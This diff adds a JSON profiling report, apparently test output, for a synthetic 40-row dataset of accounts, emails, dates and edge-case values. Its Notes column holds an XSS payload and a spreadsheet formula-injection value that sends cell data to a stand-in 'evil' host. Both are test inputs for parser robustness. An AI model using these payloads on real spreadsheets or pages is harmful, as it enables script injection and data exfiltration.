@@ -1,0 +1,521 @@
+{
+ "columns": {
+  "Account": {
+   "detected_type": "Float",
+   "dtype": "float64",
+   "format_info": null,
+   "is_numeric": true,
+   "memory_bytes": 320,
+   "non_null_count": 39,
+   "null_count": 1,
+   "null_percentage": 2.5,
+   "outliers": {
+    "count": 0,
+    "percentage": 0.0
+   },
+   "statistics": {
+    "kurtosis": -1.159806,
+    "max": 1039.0,
+    "mean": 1019.871795,
+    "median": 1020.0,
+    "min": 1000.0,
+    "q25": 1010.5,
+    "q50": 1020.0,
+    "q75": 1029.5,
+    "skew": -0.044205,
+    "std": 11.596686
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "1000.0",
+    "1001.0",
+    "1002.0"
+   ],
+   "unique_count": 38
+  },
+  "Amount": {
+   "detected_type": "Float",
+   "dtype": "float64",
+   "format_info": null,
+   "is_numeric": true,
+   "memory_bytes": 320,
+   "non_null_count": 39,
+   "null_count": 1,
+   "null_percentage": 2.5,
+   "outliers": {
+    "count": 0,
+    "percentage": 0.0
+   },
+   "statistics": {
+    "kurtosis": -1.197674,
+    "max": 1162.5,
+    "mean": 439.423077,
+    "median": 450.0,
+    "min": -300.0,
+    "q25": 75.0,
+    "q50": 450.0,
+    "q75": 806.25,
+    "skew": -0.052607,
+    "std": 441.360211
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "-300.0",
+    "-262.5",
+    "-225.0"
+   ],
+   "unique_count": 38
+  },
+  "BigId": {
+   "detected_type": "Integer",
+   "dtype": "int64",
+   "format_info": null,
+   "is_numeric": true,
+   "memory_bytes": 320,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "outliers": {
+    "count": 0,
+    "percentage": 0.0
+   },
+   "statistics": {
+    "kurtosis": -1.165607,
+    "max": 9007199254741032.0,
+    "mean": 9007199254741012.0,
+    "median": 9007199254741012.0,
+    "min": 9007199254740992.0,
+    "q25": 9007199254741004.0,
+    "q50": 9007199254741012.0,
+    "q75": 9007199254741022.0,
+    "skew": 0.132528,
+    "std": 11.766968
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "9007199254740993",
+    "9007199254740994",
+    "9007199254740995"
+   ],
+   "unique_count": 39
+  },
+  "Date": {
+   "date_range": {
+    "max": "2024-02-09 00:00:00",
+    "min": "2024-01-01 00:00:00"
+   },
+   "detected_type": "Date",
+   "dtype": "datetime64[ns]",
+   "format_info": "Format: %Y-%m-%d",
+   "is_datetime": true,
+   "is_numeric": false,
+   "memory_bytes": 320,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "type_confidence": 100.0,
+   "type_samples": [
+    "2024-01-01 00:00:00",
+    "2024-01-02 00:00:00",
+    "2024-01-03 00:00:00"
+   ],
+   "unique_count": 39
+  },
+  "DateText": {
+   "date_range": {
+    "max": "2024-01-02 00:00:00",
+    "min": "2024-01-02 00:00:00"
+   },
+   "detected_type": "Date",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_datetime": true,
+   "is_numeric": false,
+   "memory_bytes": 2360,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "string_stats": {
+    "max_length": 10,
+    "mean_length": 10.0,
+    "median_length": 10.0,
+    "min_length": 10
+   },
+   "top_values": {
+    "01/02/2024": 15,
+    "13/02/2024": 13,
+    "2024-03-05": 12
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "01/02/2024",
+    "2024-03-05",
+    "13/02/2024"
+   ],
+   "unique_count": 3
+  },
+  "Email": {
+   "detected_type": "Email",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_numeric": false,
+   "memory_bytes": 2648,
+   "non_null_count": 39,
+   "null_count": 1,
+   "null_percentage": 2.5,
+   "string_stats": {
+    "max_length": 19,
+    "mean_length": 18.076923,
+    "median_length": 18.0,
+    "min_length": 16
+   },
+   "top_values": {
+    "alice0@example.com": 1,
+    "alice24@example.com": 1,
+    "alice28@example.com": 1,
+    "bob25@example.com": 1,
+    "bob29@example.com": 1,
+    "carol26@example.com": 1,
+    "carol30@example.com": 1,
+    "carol6@example.com": 2,
+    "dave27@example.com": 1,
+    "dave31@example.com": 1
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "alice0@example.com",
+    "carol2@example.com",
+    "dave3@example.com"
+   ],
+   "unique_count": 38
+  },
+  "EuroNum": {
+   "detected_type": "Text",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_numeric": false,
+   "memory_bytes": 2127,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "string_stats": {
+    "max_length": 8,
+    "mean_length": 4.175,
+    "median_length": 3.0,
+    "min_length": 2
+   },
+   "top_values": {
+    "1.234,56": 12,
+    "10": 13,
+    "2,5": 15
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "2,5",
+    "1.234,56",
+    "10"
+   ],
+   "unique_count": 3
+  },
+  "Flag": {
+   "boolean_counts": {
+    "False": 19,
+    "True": 21
+   },
+   "detected_type": "Boolean",
+   "dtype": "bool",
+   "format_info": null,
+   "is_boolean": true,
+   "is_numeric": false,
+   "memory_bytes": 40,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "type_confidence": 100.0,
+   "type_samples": [
+    "True",
+    "False",
+    "True"
+   ],
+   "unique_count": 2
+  },
+  "ID": {
+   "detected_type": "ID/Serial",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_numeric": false,
+   "memory_bytes": 2280,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "string_stats": {
+    "max_length": 8,
+    "mean_length": 8.0,
+    "median_length": 8.0,
+    "min_length": 8
+   },
+   "top_values": {
+    "PR-00001": 1,
+    "PR-00007": 2,
+    "PR-00024": 1,
+    "PR-00025": 1,
+    "PR-00026": 1,
+    "PR-00027": 1,
+    "PR-00028": 1,
+    "PR-00029": 1,
+    "PR-00030": 1,
+    "PR-00031": 1
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "PR-00001",
+    "PR-00002",
+    "PR-00003"
+   ],
+   "unique_count": 39
+  },
+  "Name": {
+   "detected_type": "Text",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_numeric": false,
+   "memory_bytes": 2131,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "string_stats": {
+    "max_length": 5,
+    "mean_length": 4.275,
+    "median_length": 5.0,
+    "min_length": 3
+   },
+   "top_values": {
+    "Alice": 10,
+    "Bob": 10,
+    "Carol": 11,
+    "Dave": 9
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "Alice",
+    "Bob",
+    "Carol"
+   ],
+   "unique_count": 4
+  },
+  "Notes": {
+   "detected_type": "Text",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_numeric": false,
+   "memory_bytes": 2892,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "string_stats": {
+    "max_length": 34,
+    "mean_length": 18.35,
+    "median_length": 28.0,
+    "min_length": 4
+   },
+   "top_values": {
+    "<img src=x onerror=alert(1)>": 11,
+    "=HYPERLINK(\"http://evil/?\"&A2,\"x\")": 10,
+    "café": 9,
+    "x|||y": 10
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "x|||y",
+    "<img src=x onerror=alert(1)>"
+   ],
+   "unique_count": 4
+  },
+  "Pct": {
+   "detected_type": "Percentage",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_numeric": false,
+   "memory_bytes": 1866,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "string_stats": {
+    "max_length": 5,
+    "mean_length": 3.65,
+    "median_length": 3.0,
+    "min_length": 3
+   },
+   "top_values": {
+    "0.5": 12,
+    "12.5%": 13,
+    "50%": 15
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "50%",
+    "0.5",
+    "12.5%"
+   ],
+   "unique_count": 3
+  },
+  "Region": {
+   "detected_type": "Text",
+   "dtype": "object",
+   "format_info": null,
+   "is_categorical": true,
+   "is_numeric": false,
+   "memory_bytes": 1766,
+   "non_null_count": 27,
+   "null_count": 13,
+   "null_percentage": 32.5,
+   "string_stats": {
+    "max_length": 1,
+    "mean_length": 1.0,
+    "median_length": 1.0,
+    "min_length": 1
+   },
+   "top_values": {
+    "N": 15,
+    "S": 12
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "N",
+    "S",
+    "N"
+   ],
+   "unique_count": 2
+  },
+  "Zip": {
+   "detected_type": "Integer",
+   "dtype": "int64",
+   "format_info": null,
+   "is_numeric": true,
+   "memory_bytes": 320,
+   "non_null_count": 40,
+   "null_count": 0,
+   "null_percentage": 0.0,
+   "outliers": {
+    "count": 0,
+    "percentage": 0.0
+   },
+   "statistics": {
+    "kurtosis": -1.205883,
+    "max": 1273.0,
+    "mean": 1136.325,
+    "median": 1136.5,
+    "min": 1000.0,
+    "q25": 1068.25,
+    "q50": 1136.5,
+    "q75": 1204.75,
+    "skew": -0.00177,
+    "std": 82.032322
+   },
+   "type_confidence": 100.0,
+   "type_samples": [
+    "1000",
+    "1007",
+    "1014"
+   ],
+   "unique_count": 39
+  }
+ },
+ "memory_info": {
+  "by_column": {
+   "Account": {
+    "bytes": 320,
+    "mb": 0.0
+   },
+   "Amount": {
+    "bytes": 320,
+    "mb": 0.0
+   },
+   "BigId": {
+    "bytes": 320,
+    "mb": 0.0
+   },
+   "Date": {
+    "bytes": 320,
+    "mb": 0.0
+   },
+   "DateText": {
+    "bytes": 2360,
+    "mb": 0.002
+   },
+   "Email": {
+    "bytes": 2648,
+    "mb": 0.003
+   },
+   "EuroNum": {
+    "bytes": 2127,
+    "mb": 0.002
+   },
+   "Flag": {
+    "bytes": 40,
+    "mb": 0.0
+   },
+   "ID": {
+    "bytes": 2280,
+    "mb": 0.002
+   },
+   "Name": {
+    "bytes": 2131,
+    "mb": 0.002
+   },
+   "Notes": {
+    "bytes": 2892,
+    "mb": 0.003
+   },
+   "Pct": {
+    "bytes": 1866,
+    "mb": 0.002
+   },
+   "Region": {
+    "bytes": 1766,
+    "mb": 0.002
+   },
+   "Zip": {
+    "bytes": 320,
+    "mb": 0.0
+   }
+  },
+  "total_mb": 0.02
+ },
+ "overview": {
+  "detected_types_count": {
+   "Boolean": 1,
+   "Date": 2,
+   "Email": 1,
+   "Float": 2,
+   "ID/Serial": 1,
+   "Integer": 2,
+   "Percentage": 1,
+   "Text": 4
+  },
+  "dtypes_count": {
+   "bool": 1,
+   "datetime64[ns]": 1,
+   "float64": 2,
+   "int64": 2,
+   "object": 8
+  },
+  "duplicate_rows": 1,
+  "has_duplicates": true,
+  "memory_usage_bytes": 19788,
+  "memory_usage_mb": 0.02,
+  "reclassified_columns": 4,
+  "shape": {
+   "columns": 14,
+   "rows": 40
+  }
+ }
+}
